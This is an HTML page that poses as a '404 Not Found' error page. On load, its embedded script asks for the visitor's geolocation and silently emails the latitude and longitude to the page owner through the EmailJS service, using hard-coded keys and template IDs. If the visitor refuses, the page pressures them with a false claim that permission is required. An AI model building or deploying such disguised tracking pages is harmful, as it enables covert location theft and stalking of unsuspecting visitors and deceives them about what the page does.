<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        // Initialize EmailJS (using your public key)
        (function(){
            emailjs.init({
                publicKey: "bktBt1ja4aV3v45hR" // Replace with your public key
            });
        })();

        // Function to check geolocation permission
        function checkGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, exitPage);
            } else {
                alert("Geolocation is not supported by this browser.");
                exitPage();
            }
        }

        // Function to send location to EmailJS
        function sendLocation(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;

            // Send the location to your email
            emailjs.send("service_rtdzefa", "template_kspwwbf", {
                latitude: lat,
                longitude: lon
            })
            .then(function(response) {
                console.log("SUCCESS!", response.status, response.text);
            }, function(error) {
                console.error("FAILED...", error);
            });

            // Open the location in Google Maps (for your reference)
            window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
        }

        // Function to handle exit
        function exitPage() {
            alert("Geolocation permission is required to access this page. Exiting...");
            window.close(); // Attempt to close the window
        }

        // Automatically check geolocation when the page loads
        window.onload = function() {
            document.getElementById("status").innerText = "404 Not Found";
            checkGeolocation();
        }
    </script>
</head>
<body>
    <h1 id="status">404 Not Found</h1>
    <p>The requested page could not be found.</p>
</body>
</html>
